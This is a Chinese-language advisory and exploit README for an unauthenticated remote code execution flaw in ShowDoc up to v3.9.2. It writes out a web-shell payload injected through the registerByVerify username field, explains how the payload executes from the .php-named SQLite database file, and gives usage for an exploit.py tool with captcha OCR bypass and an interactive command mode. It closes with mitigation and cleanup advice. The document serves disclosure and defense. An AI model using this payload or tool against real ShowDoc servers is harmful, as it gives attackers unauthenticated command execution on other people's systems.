# ShowDoc <= 3.9.2 registerByVerify Unauthenticated PHP Code Injection RCE

ShowDoc registerByVerify 注册接口用户名 PHP 代码注入, 未授权远程代码执行。

- 漏洞编号: XVE-2026-54414
- 影响版本: ShowDoc <= **v3.9.2**
- 修复版本: v3.9.3
- 前置条件: 注册功能开启 (默认开启), 无需任何认证

> 仅用于授权安全研究与教学, 请勿对未授权目标使用。

## 一、漏洞概述

ShowDoc 注册接口 `/server/index.php?s=/api/user/registerByVerify` 对 `username`
参数仅做 `trim()` 处理, 无字符类型校验。恶意用户名作为普通字符串写入 SQLite
数据库文件 `Sqlite/showdoc.db.php`; 该文件以 `.php` 结尾, Web 服务器将其交给
PHP 解析。访问该文件即触发库内存储的恶意 PHP 代码, 实现未授权 RCE。

## 二、漏洞原理

### 攻击链总览

```
攻击者                          ShowDoc (v3.9.2, SQLite 存储)
  │  POST /server/index.php           │
  │  s=/api/user/registerByVerify     │
  │  username=<?php system(...);      │
  │          __halt_compiler();       │
  ├──────────────────────────────────▶│ ① trim() 处理, 无字符校验
  │                                   │ ② INSERT INTO user
  │                                   │    落地 Sqlite/showdoc.db.php
  │  GET /Sqlite/showdoc.db.php       │
  │      ?cmd=id                      │
  ├──────────────────────────────────▶│ ③ .php 后缀 → nginx → php-fpm
  │                                   │ ④ 标签前二进制 = 内联 HTML
  │      uid=xxx(...)                 │ ⑤ payload = 首个 <?php 标签
  │◀──────────────────────────────────┤    system() 执行
  │                                   │ ⑥ __halt_compiler() 终止编译
```

### 1. 注入点

`registerByVerify()` — `server/app/Api/Controller/UserController.php:174`:

```php
$username = trim($this->getParam($request, 'username', ''));
```

过滤逻辑: `trim()`。字符类型校验: 无。恶意用户名进入 INSERT 语句, 存储类型 TEXT。

v3.9.3 补充格式正则 `^[a-zA-Z0-9_\-\x{4e00}-\x{9fa5}]{2,30}$`。

### 2. 落地点

默认存储 SQLite。数据库文件: `Sqlite/showdoc.db.php`
(`server/app/Common/Database/Database.php:25`, `DB_NAME` 默认值)。

`.php` 后缀的设计意图: 阻止静态下载。副作用: 库内字符串具备进入 PHP
词法扫描的通道。

### 3. 触发点

`GET /Sqlite/showdoc.db.php` → nginx 匹配 `.php` 后缀 → php-fpm 解析。

PHP 词法规则:

- `<?php` 标签前的内容属内联 HTML: 输出, 无编译;
- 标签内内容进入编译; parse error 属编译期致命错误, 文件无执行阶段。

SQLite 文件头 `SQLite format 3\x00` 与页二进制的标签外部分: 输出二进制
乱码, 语法影响为零。

### 4. 页布局: payload 的编译顺序

利用前提: payload 的编译顺序先于文件内一切 parse error 源。

模板库状态 (GitHub 仓库与官方镜像内 `Sqlite/showdoc.db.php` 的 MD5 一致):

- page_size 1024, page 1 为 sqlite_master;
- 表数量 24, options 表无数据, `db_version_num` 取默认 0;
- offset 929 存在防下载表名 `<?php ` (name / tbl_name / CREATE SQL 三处),
  实测字节:

  ```
  b'...\x01\x811table<?php <?php \x02CREATE TABLE "<?php " (\n\t`...'
  ```

- 表名标签内的 `\x02CREATE TABLE "<?php " (` 引发 parse error;
- user 表数据页物理位置靠后, 注入数据编译顺序靠后;
- 模板库布局的利用结果: 失败。

首个 HTTP API 请求重排布局:

1. `server/app/Common/bootstrap.php:19`: `if (PHP_SAPI !== 'cli') Upgrade::checkAndUpgrade()`;
2. `db_version_num (0) < CURRENT_VERSION (32)` → `updateSqlite()` 执行;
3. DDL: 26 个 CREATE TABLE + 10 余处 ALTER TABLE ADD COLUMN (user 表补 salt 列);
4. sqlite_master 写入 26 个新 cell, 防下载表名 cell 迁移至文件后部 (实测 offset 7073);
5. user 表 rootpage = 4 (ALTER 加列, 数据页位置不变), 新注册行写入 page 4
   尾部 cell 区 (实测 offset 3937)。

容器首启的 `docker.run.sh` 执行 `php index.php /api/update/dockerUpdateCode`,
CLI 模式, `PHP_SAPI === 'cli'`, 升级流程被跳过 — 实测首启后防下载表名
位于 offset 931, install 向导不触及库结构, `createCaptcha` 等 API 请求
为首个触发点。

结果: payload 成为文件内第一个 `<?php` 标签, 编译顺序先于防下载表名。
实例被任意用户正常访问一次 (升级已执行) 后, 注入即成立。

### 5. `__halt_compiler()` 的作用

语义: 编译器保留字; 调用点终止本文件编译, 其后字节退出词法分析。

效果:

- offset 7073 的防下载表名与全部后续二进制退出编译范围, parse error 源清零;
- 二进制内随机 `<?` 字节的语法影响清零。

payload 两段分工:

- `system($_REQUEST["cmd"])`: 命令执行原语;
- `__halt_compiler()`: 编译存活性保障。

缺失 `__halt_compiler()` 的结果: 编译失败于 offset 7073, 文件无执行阶段,
RCE 链断。

### 6. 修复版本行为

v3.9.3 对 `registerByVerify()` 与 `login()` 的 username 参数增加格式正则。
本 payload 的注册响应:

```
{"error_code":10101,"error_message":"用户名只允许字母、数字、下划线、横线、中文，2-30个字符"}
```

## 三、利用工具

依赖: Python 3 标准库; `--ocr` 模式需 [ddddocr](https://pypi.org/project/ddddocr/):

```bash
pip install ddddocr
```

用法:

```bash
# 自动打码 (推荐): 双模型识别 + 失败自动换码重试
python3 exploit.py --url http://<target>:<port> --ocr --cmd id

# 手动验证码: 脚本下载验证码图片后输入, 或 --captcha 直接指定
python3 exploit.py --url http://<target>:<port> --captcha XXXX --cmd id

# 交互模式
python3 exploit.py --url http://<target>:<port> --ocr -i
```

| 参数 | 说明 |
|---|---|
| `--url` | 目标根 URL (必填) |
| `--cmd` | 单条命令, 默认 `id` |
| `--ocr` | ddddocr 新旧双模型集成打码, 输出一致且符合字符集/长度约束才提交 |
| `--captcha` | 手动指定验证码 |
| `--db` | 目标 SQLite 库文件本机可达时, 直接读取验证码明文 |
| `-i` | 交互式命令执行 |

验证码特征: Gregwar\Captcha, 4 位, 字符集 `ABCDEFGHJKLMNPQRSTUVWXYZ23456789`
(无 0/O/1/I), 校验忽略大小写; 每次重试均为新 captcha_id, 接口无频率限制。

payload 尾部随机后缀位于 `__halt_compiler();` 之后, 编译器忽略,
保证用户名唯一, 支持重复利用。

## 四、修复与缓解建议

1. 升级到 **v3.9.3+**;
2. WAF/网关对 `registerByVerify` 的 `username` 参数拦截包含 `<?`、
   `__halt_compiler`、`system(` 等特征的请求;
3. Web 服务器层禁止直接访问 `/Sqlite/` 目录 (单独执行即可切断触发路径);
4. 已注入实例: 升级不清除已入库的恶意行, 需执行
   `DELETE FROM user WHERE username LIKE '<?php%';` 并确认触发路径关闭。

## 参考

- 微步在线漏洞通告 (XVE-2026-54414)
- https://github.com/star7th/showdoc
